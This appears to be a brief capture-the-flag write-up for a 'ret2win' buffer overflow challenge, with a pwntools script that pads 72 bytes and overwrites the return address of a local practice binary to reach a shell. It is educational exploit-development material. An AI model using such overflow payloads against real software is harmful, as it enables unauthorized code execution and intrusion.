---
title: "example challenge"
date: 2026-01-15
description: "simple ret2win"
---

## challenge

basic buffer overflow with no PIE and no canary. ret2win.

## solution

```python
from pwn import *

p = process('./vuln')
payload = b'A' * 72 + p64(0x401196)
p.sendline(payload)
p.interactive()
```

got shell.
